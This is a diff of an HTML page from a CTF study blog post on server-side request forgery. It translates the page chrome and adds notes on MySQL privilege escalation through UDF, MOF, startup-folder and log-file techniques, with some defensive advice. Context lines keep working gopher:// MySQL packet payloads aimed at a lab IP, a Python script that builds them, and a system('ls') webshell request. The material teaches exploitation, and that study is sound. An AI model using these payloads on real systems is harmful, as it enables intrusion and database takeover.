@@ -1,5 +1,5 @@
 
-<!DOCTYPE html><html lang="zh-CN">
+<!DOCTYPE html><html lang="en">
 
 <head>
   <meta charset="utf-8">
@@ -26,10 +26,10 @@
 <meta property="og:url" content="http://example.com/2025/08/29/SSRF/">
 <meta property="og:site_name" content="Sauy&#39;s corner">
 <meta property="og:description" content="SSRF概念SSRF(Server-Side Request Forgery)，即服务器端请求伪造，利用漏洞伪造服务器端发起请求，从而突破客户端获取不到数据限制，本质上是属于信息泄露漏洞。 漏洞原理服务端提供了从其他服务器应用获取数据的功能且没有对地址和协议等做过滤和限制，比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等，而且在大部分的web服务器架构中，web服务器自身是可以访">
-<meta property="og:locale" content="zh_CN">
+<meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://example.com/images/sauy.jpg">
 <meta property="article:published_time" content="2025-08-29T08:30:30.000Z">
-<meta property="article:modified_time" content="2025-12-16T14:44:26.976Z">
+<meta property="article:modified_time" content="2026-04-01T11:14:39.460Z">
 <meta property="article:author" content="Sauy">
 <meta property="article:tag" content="CTF学习">
 <meta name="twitter:card" content="summary_large_image">
@@ -49,7 +49,7 @@
 
   
 
-  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Sauy","sameAs":[],"image":"/images/sauy.jpg"},"dateCreated":"2025-08-29T16:30:30+08:00","dateModified":"2025-12-16T22:44:26+08:00","datePublished":"2025-08-29T16:30:30+08:00","description":"","headline":"SSRF","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2025/08/29/SSRF/"},"publisher":{"@type":"Organization","name":"Sauy","sameAs":[],"image":"/images/sauy.jpg","logo":{"@type":"ImageObject","url":"/images/sauy.jpg"}},"url":"http://example.com/2025/08/29/SSRF/","keywords":"CTF学习","thumbnailUrl":"/images/26.jpg","image":1}</script>
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Sauy","sameAs":[],"image":"/images/sauy.jpg"},"dateCreated":"2025-08-29T16:30:30+08:00","dateModified":"2026-04-01T19:14:39+08:00","datePublished":"2025-08-29T16:30:30+08:00","description":"","headline":"SSRF","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2025/08/29/SSRF/"},"publisher":{"@type":"Organization","name":"Sauy","sameAs":[],"image":"/images/sauy.jpg","logo":{"@type":"ImageObject","url":"/images/sauy.jpg"}},"url":"http://example.com/2025/08/29/SSRF/","keywords":"CTF学习","thumbnailUrl":"/images/26.jpg","image":1}</script>
   
 </head>
 <body>
@@ -64,11 +64,11 @@
 <nav class="menu dis-select"></nav>
 </div>
 <div class="widgets">
-<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>
+<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="Search"></form><div id="search-result"></div><div class="search-no-result">No Results!</div></div>
 
 
 
-<widget class="widget-wrapper recent post-list"><div class="widget-header dis-select"><span class="name">最近更新</span></div><div class="widget-body fs14"><a class="item title" href="/2026/03/20/Kerberos%E5%8D%8F%E8%AE%AE%E5%8F%8A%E5%85%B6%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/"><span class="title">Kerberos协议及其攻击手法</span></a><a class="item title" href="/2100/01/22/HTB-Practice/"><span class="title">渗透靶机-wp-长期更新</span></a><a class="item title" href="/2026/03/08/JAVA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"><span class="title">java反射机制解析(含cc1解析)</span></a><a class="item title" href="/2025/12/18/SECCON%20CTF%2014%20Quals-%E5%A4%8D%E7%8E%B0/"><span class="title">SECCON CTF 14 Quals-broken-challenge</span></a><a class="item title" href="/2026/02/04/next.js%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"><span class="title">施工ing-next.js之CVE-2025-55182代码审计</span></a><a class="item title" href="/2026/02/06/UniCTF2026/"><span class="title">UniCTF-WEB WP</span></a><a class="item title" href="/2025/08/29/SSRF/"><span class="title">SSRF</span></a><a class="item title" href="/2025/12/08/xpath-%E6%B3%A8%E5%85%A5/"><span class="title">BackdoorCTF2025之Trust Issues</span></a><a class="item title" href="/2025/12/04/HeroCTF%20v7-WEB/"><span class="title">HeroCTF v7-web</span></a><a class="item title" href="/2025/11/14/Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6RCE/"><span class="title">Redis主从复制RCE</span></a></div></widget>
+<widget class="widget-wrapper recent post-list"><div class="widget-header dis-select"><span class="name">Recent Update</span></div><div class="widget-body fs14"><a class="item title" href="/2025/08/29/SSRF/"><span class="title">SSRF</span></a><a class="item title" href="/2100/01/22/HTB-Practice/"><span class="title">渗透靶机-wp-长期更新</span></a><a class="item title" href="/2026/03/20/Kerberos%E5%8D%8F%E8%AE%AE%E5%8F%8A%E5%85%B6%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/"><span class="title">Kerberos协议及其攻击手法</span></a><a class="item title" href="/2026/03/08/JAVA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"><span class="title">java反射机制解析(含cc1解析)</span></a><a class="item title" href="/2025/12/18/SECCON%20CTF%2014%20Quals-%E5%A4%8D%E7%8E%B0/"><span class="title">SECCON CTF 14 Quals-broken-challenge</span></a><a class="item title" href="/2026/02/04/next.js%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"><span class="title">施工ing-next.js之CVE-2025-55182代码审计</span></a><a class="item title" href="/2026/02/06/UniCTF2026/"><span class="title">UniCTF-WEB WP</span></a><a class="item title" href="/2025/12/08/xpath-%E6%B3%A8%E5%85%A5/"><span class="title">BackdoorCTF2025之Trust Issues</span></a><a class="item title" href="/2025/12/04/HeroCTF%20v7-WEB/"><span class="title">HeroCTF v7-web</span></a><a class="item title" href="/2025/11/14/Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6RCE/"><span class="title">Redis主从复制RCE</span></a></div></widget>
 </div>
 
 </div></aside><div class="l_main" id="main">
@@ -79,9 +79,9 @@
 
 <div class="article banner top">
   <div class="content">
-    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
-<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a></div>
-<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2025-08-29T08:30:30.000Z">2025-08-29</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2025-12-16T14:44:26.976Z">2025-12-16</time></span></div></div></div>
+    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">Home</a>
+<span class="sep"></span><a class="cap breadcrumb" href="/">Blog</a></div>
+<div class="flex-row" id="post-meta"><span class="text created">Posted on: <time datetime="2025-08-29T08:30:30.000Z">2025-08-29</time></span><span class="sep updated"></span><span class="text updated">Updated on: <time datetime="2026-04-01T11:14:39.460Z">2026-04-01</time></span></div></div></div>
     
     <div class="bottom only-title">
       
@@ -179,15 +179,21 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=http://172.72.23.28/2333.php?1=system(&#x27;ls&#x27;);</span><br></pre></td></tr></table></figure>
 
 <p>执行命令即可</p>
+<p>　　<strong>完全禁用gopher&#x2F;dict协议还可以打redis吗?</strong></p>
+<p>　　可以,如果支持http协议的ssrf漏洞,同时还存在crlf漏洞,那么可以利用crlf+http打redis:</p>
+<p>​	header CRLF</p>
 <h3 id="MYSQL查询数据"><a href="#MYSQL查询数据" class="headerlink" title="MYSQL查询数据"></a>MYSQL查询数据</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MySQL 需要密码认证时，服务器先发送 salt 然后客户端使用 salt 加密密码然后验证；但是当无需密码认证时直接发送 TCP/IP 数据包即可。所以这种情况下是可以直接利用 SSRF 漏洞攻击 MySQL 的。因为使用 gopher 协议进行攻击需要原始的 MySQL 请求的 TCP 数据包</span><br></pre></td></tr></table></figure>
 
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">results</span>(<span class="params">s</span>):</span><br><span class="line">    a=[s[i:i+<span class="number">2</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(s),<span class="number">2</span>)]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;gopher://172.72.23.29:3306/_%&quot;</span>+<span class="string">&quot;%&quot;</span>.join(a)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    s = <span class="string">&quot;a100000185a23f0000000001080000000000000000000000000000000000000000000000726f6f7400006d7973716c5f6e61746976655f70617373776f72640064035f6f73054c696e75780c5f636c69656e745f6e616d65086c69626d7973716c045f706964033530380f5f636c69656e745f76657273696f6e06352e362e3531095f706c6174666f726d067838365f36340c70726f6772616d5f6e616d65056d7973716c210000000373656c65637420404076657273696f6e5f636f6d6d656e74206c696d697420313d0000000373656c656374202a2066726f6d20666c61672e7465737420756e696f6e2073656c656374207573657228292c277777772e73716c7365632e636f6d270100000001&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(results(s))</span><br></pre></td></tr></table></figure>
 
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://172.72.23.29:3306/_%a1%00%00%01%85%a2%3f%00%00%00%00%01%08%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%64%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%03%35%30%38%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%36%2e%35%31%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%21%00%00%00%03%73%65%6c%65%63%74%20%40%40%76%65%72%73%69%6f%6e%5f%63%6f%6d%6d%65%6e%74%20%6c%69%6d%69%74%20%31%3d%00%00%00%03%73%65%6c%65%63%74%20%2a%20%66%72%6f%6d%20%66%6c%61%67%2e%74%65%73%74%20%75%6e%69%6f%6e%20%73%65%6c%65%63%74%20%75%73%65%72%28%29%2c%27%77%77%77%2e%73%71%6c%73%65%63%2e%63%6f%6d%27%01%00%00%00%01</span><br></pre></td></tr></table></figure>
 
+<p>mysql get shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">secure_file_priv</span><br><span class="line">null        表示限制mysqld 不允许导入或导出</span><br><span class="line">/tmp/     表示限制mysqld 的导入或导出只能发生在/tmp/目录下</span><br><span class="line">没有具体值   表示不对mysqld 的导入或导出做限制</span><br></pre></td></tr></table></figure>
+
 <h3 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SSRF攻击MySQL仅仅查询数据意义不大，不如直接UDF提权然后反弹shell出来更加直接</span><br></pre></td></tr></table></figure>
 
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UDF (User Defined Function) 是 MySQL 的一个扩展机制，可以让数据库加载外部动态链接库（Linux 下是 .so，Windows 下是 .dll），注册成函数，然后就能在 SQL 语句里调用。</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UDF (User Defined Function) 是 MySQL 的一个扩展机制，可以让数据库加载外部动态链接库（Linux 下是 .so，Windows 下是 .dll），注册成函数，然后就能在 SQL 语句里调用，从而实现权限提升。</span><br></pre></td></tr></table></figure>
 
 <p>首先你要先知道mysql的插件目录</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://172.72.23.29:3306/_%a2%00%00%01%85%a2%3f%00%00%00%00%01%08%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%65%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%04%33%35%35%34%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%36%2e%35%31%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%21%00%00%00%03%73%65%6c%65%63%74%20%40%40%76%65%72%73%69%6f%6e%5f%63%6f%6d%6d%65%6e%74%20%6c%69%6d%69%74%20%31%20%00%00%00%03%73%68%6f%77%20%76%61%72%69%61%62%6c%65%73%20%6c%69%6b%65%20%0a%27%25%70%6c%75%67%69%6e%25%27%01%00%00%00%01</span><br></pre></td></tr></table></figure>
@@ -196,6 +202,43 @@
 <p>可知插件目录为 &#x2F;usr&#x2F;lib&#x2F;mysql&#x2F;plugin</p>
 <p>这里还可以使用一个工具 <a target="_blank" rel="noopener" href="https://github.com/tarunkant/Gopherus">https://github.com/tarunkant/Gopherus</a> python2环境</p>
 <p><img src="/images/image-20250827181559783.png" alt="image-20250827181559783"></p>
+<h4 id="版本区别"><a href="#版本区别" class="headerlink" title="版本区别"></a>版本区别</h4><p><strong>MySQL ≤ 5.1</strong>：</p>
+<ul>
+<li>UDF文件需放置在系统目录：<ul>
+<li>Windows：<code>%windir%\system32</code>（如<code>C:\Windows\System32</code>）</li>
+<li>Linux：<code>/usr/lib</code></li>
+</ul>
+</li>
+</ul>
+<p><strong>MySQL &gt; 5.1</strong>：</p>
+<p>​	DF文件需放置在MySQL的插件目录（<code>plugin_dir</code>），可通过以下命令查看：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT @@plugin_dir;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>Windows示例：<code>C:\Program Files\MySQL\MySQL Server X.X\lib\plugin</code></p>
+</li>
+<li><p>Linux示例：<code>/usr/lib/mysql/plugin/</code></p>
+</li>
+<li><p>原因：MySQL 5.1之后引入了独立的插件目录机制。</p>
+</li>
+<li><p><strong>限制与防御</strong>：</p>
+<ul>
+<li>设置<code>secure_file_priv</code>为限制目录。</li>
+<li>以低权限运行MySQL服务。</li>
+<li>定期审计插件目录和UDF函数。</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MySQL提权的其他方法</span><br><span class="line">除了UDF提权，MySQL还有以下提权方式：</span><br></pre></td></tr></table></figure>
+
+<h4 id="MOF提权（Windows）："><a href="#MOF提权（Windows）：" class="headerlink" title="MOF提权（Windows）："></a>MOF提权（Windows）：</h4><p>原理：利用SELECT INTO OUTFILE将恶意MOF（Managed Object Format）文件写入C:\Windows\System32\wbem\mof\目录，触发系统执行。</p>
+<p>条件：需要MySQL以高权限运行，且secure_file_priv允许写入。</p>
+<h4 id="启动项提权："><a href="#启动项提权：" class="headerlink" title="启动项提权："></a>启动项提权：</h4><p>原理：将恶意脚本写入系统启动目录（如Windows的C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp），等待重启后执行。</p>
+<p>条件：需要文件系统写权限。</p>
+<h4 id="日志文件提权："><a href="#日志文件提权：" class="headerlink" title="日志文件提权："></a>日志文件提权：</h4><p>原理：通过修改MySQL日志文件路径（如general_log_file），将恶意脚本写入可执行位置，并通过其他漏洞触发执行。</p>
+<p>条件：需要控制日志配置权限。</p>
+<h4 id="利用MySQL-root权限："><a href="#利用MySQL-root权限：" class="headerlink" title="利用MySQL root权限："></a>利用MySQL root权限：</h4><p>原理：若MySQL以root或SYSTEM权限运行，可直接通过SQL命令（如LOAD_FILE或INTO OUTFILE）操作系统文件或执行命令。</p>
+<p>条件：拥有MySQL root账户权限。</p>
 <h3 id="fpm（FastCGI协议）"><a href="#fpm（FastCGI协议）" class="headerlink" title="fpm（FastCGI协议）"></a>fpm（FastCGI协议）</h3><p>详细原理文章<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html">Fastcgi协议分析 &amp;&amp; PHP-FPM未授权访问漏洞 &amp;&amp; Exp编写 | 离别歌</a></p>
 <p>可以使用上述的工具</p>
 <p>具体操作：</p>
@@ -206,15 +249,15 @@
 </article>
 <div class="article-footer">
     <section id="license">
-      <div class="header"><span>许可协议</span></div>
-      <div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
+      <div class="header"><span>License</span></div>
+      <div class="body"><p>This article is licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a>. Please include attribution when reposting.</p>
 </div>
     </section>
     
 
 </div>
 
-<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/2025/09/01/bypass-disablefunction/">Bypass disablefunction</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2025/08/24/NSS4th/">NSS4th-wp</a></div></section></div>
+<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">Newer</div><a href="/2025/09/01/bypass-disablefunction/">Bypass disablefunction</a></div><div class="item" id="next"><div class="note">Older</div><a href="/2025/08/24/NSS4th/">NSS4th-wp</a></div></section></div>
 
 
 
@@ -228,7 +271,7 @@
 
 
 
-<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SSRF"><span class="toc-text">SSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E5%BF%B5"><span class="toc-text">概念</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%87%BD%E6%95%B0"><span class="toc-text">常见漏洞函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#file-get-contents"><span class="toc-text">file_get_contents()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#curl-exec"><span class="toc-text">curl_exec()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fsockopen"><span class="toc-text">fsockopen()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fopen"><span class="toc-text">fopen()</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%8F%E8%AE%AE"><span class="toc-text">协议</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#http-s"><span class="toc-text">http(s):&#x2F;&#x2F;</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80"><span class="toc-text">基础</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8D%87%E7%BA%A7"><span class="toc-text">升级</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#file"><span class="toc-text">file:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dict"><span class="toc-text">dict:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#gopher"><span class="toc-text">gopher:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ftp"><span class="toc-text">ftp:&#x2F;&#x2F;</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bypass"><span class="toc-text">Bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-text">利用[::]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-1"><span class="toc-text">利用@</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E7%9F%AD%E5%9C%B0%E5%9D%80"><span class="toc-text">利用短地址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8302%E8%B7%B3%E8%BD%AC"><span class="toc-text">利用302跳转</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8DNS%E9%87%8D%E7%BB%91%E5%AE%9A"><span class="toc-text">利用DNS重绑定</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E8%BF%9B%E5%88%B6%E8%BD%AC%E6%8D%A2"><span class="toc-text">利用进制转换</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E7%89%B9%E6%AE%8A%E5%9C%B0%E5%9D%80"><span class="toc-text">利用特殊地址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%8F%A5%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="toc-text">利用句号绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8IPv6"><span class="toc-text">利用IPv6</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8IDN"><span class="toc-text">利用IDN</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E7%89%B9%E5%AE%9A%E7%BB%93%E5%B0%BE%E5%BC%80%E5%A4%B4"><span class="toc-text">绕过特定结尾开头</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6"><span class="toc-text">读取本地文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8E%A2%E6%B5%8B%E5%86%85%E7%BD%91%E7%AB%AF%E5%8F%A3"><span class="toc-text">探测内网端口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Redis"><span class="toc-text">Redis</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%AA%E6%8E%88%E6%9D%83"><span class="toc-text">未授权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BC%B1%E8%AE%A4%E8%AF%81"><span class="toc-text">弱认证</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MYSQL%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE"><span class="toc-text">MYSQL查询数据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#UDF%E6%8F%90%E6%9D%83"><span class="toc-text">UDF提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fpm%EF%BC%88FastCGI%E5%8D%8F%E8%AE%AE%EF%BC%89"><span class="toc-text">fpm（FastCGI协议）</span></a></li></ol></li></ol></li></ol></div><div class="widget-footer"><a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><!-- Icon from Solar by 480 Design - https://creativecommons.org/licenses/by/4.0/ --><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="1.5"><path stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/><path d="M7 3.338A9.95 9.95 0 0 1 12 2c5.523 0 10 4.477 10 10s-4.477 10-10 10S2 17.523 2 12c0-1.821.487-3.53 1.338-5"/></g></svg><span>回到顶部</span></a></div></widget>
+<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">On This Page</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SSRF"><span class="toc-text">SSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E5%BF%B5"><span class="toc-text">概念</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%87%BD%E6%95%B0"><span class="toc-text">常见漏洞函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#file-get-contents"><span class="toc-text">file_get_contents()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#curl-exec"><span class="toc-text">curl_exec()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fsockopen"><span class="toc-text">fsockopen()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fopen"><span class="toc-text">fopen()</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%8F%E8%AE%AE"><span class="toc-text">协议</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#http-s"><span class="toc-text">http(s):&#x2F;&#x2F;</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80"><span class="toc-text">基础</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8D%87%E7%BA%A7"><span class="toc-text">升级</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" 